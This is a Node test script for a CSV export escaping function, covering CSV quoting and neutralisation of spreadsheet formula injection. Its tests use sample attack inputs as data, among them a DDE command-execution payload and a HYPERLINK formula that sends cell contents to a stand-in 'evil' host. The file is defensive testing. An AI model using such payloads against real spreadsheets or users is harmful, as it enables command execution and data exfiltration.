/**
 * CSV export escaping tests
 * Run: node scripts/test-csv.js
 *
 * Guards two separate contracts on the one function every CSV export funnels
 * through (invoices, customers, products, reports, the admin key ledger and the
 * feedback inbox):
 *
 *   1. CSV syntax — a value containing a quote, comma or newline is wrapped and
 *      its own quotes doubled.
 *   2. Spreadsheet formula injection — a cell that *starts* with =, +, -, @,
 *      TAB or CR is executed by Excel / Sheets / LibreOffice, so it must be
 *      neutralised before the file leaves the device. This is OWASP CSV
 *      Injection, and customer names, product names and notes are all
 *      user-supplied.
 */
import { csvEscape } from '../js/export.js';

let pass = 0;
let fail = 0;

function assert(name, actual, expected) {
  const ok = actual === expected;
  if (ok) { pass++; console.log(`  ✓ ${name}`); }
  else { fail++; console.log(`  ✗ ${name} — expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`); }
}

const DOUBLE = '"' + '"'; // two quotes, built by concatenation so no formatter
                          // can silently fold them into one

console.log('== CSV syntax ==');
assert('plain value untouched', csvEscape('Cashew Nuts'), 'Cashew Nuts');
assert('number', csvEscape(1200.5), '1200.5');
assert('null -> empty', csvEscape(null), '');
assert('undefined -> empty', csvEscape(undefined), '');
assert('comma is quoted', csvEscape('Dar es Salaam, TZ'), '"Dar es Salaam, TZ"');
assert('quote is doubled and wrapped', csvEscape('say "hi"'), `"say ${DOUBLE}hi${DOUBLE}"`);
assert('newline is quoted', csvEscape('line1\nline2'), '"line1\nline2"');

console.log('\n== formula injection ==');
assert('leading = neutralised', csvEscape('=1+1'), "'=1+1");
assert('leading + neutralised', csvEscape('+1'), "'+1");
assert('leading - neutralised', csvEscape('-1'), "'-1");
assert('leading @ neutralised', csvEscape('@SUM(A1)'), "'@SUM(A1)");
assert('leading tab neutralised', csvEscape('\tx'), "'\tx");
// The classic DDE payload: no comma/quote/newline, so only the apostrophe
// prefix protects it — which is exactly the case the old code missed.
assert('DDE payload neutralised', csvEscape("=cmd|'/c calc'!A1"), "'=cmd|'/c calc'!A1");
// A payload that also needs CSV quoting gets both treatments.
assert('HYPERLINK payload quoted AND neutralised',
  csvEscape('=HYPERLINK("http://evil/"&A1,"x")'),
  `"'=HYPERLINK(${DOUBLE}http://evil/${DOUBLE}&A1,${DOUBLE}x${DOUBLE})"`);

console.log('\n== property: an escaped cell never begins a formula ==');
const FORMULA_START = /^[=+\-@\t\r]/;
for (const payload of ['=1+1', '+1', '-1', '@cmd', '\tx', '\rx', '=HYPERLINK("x")']) {
  assert(`does not start a formula: ${JSON.stringify(payload)}`, FORMULA_START.test(csvEscape(payload)), false);
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail > 0 ? 1 : 0);
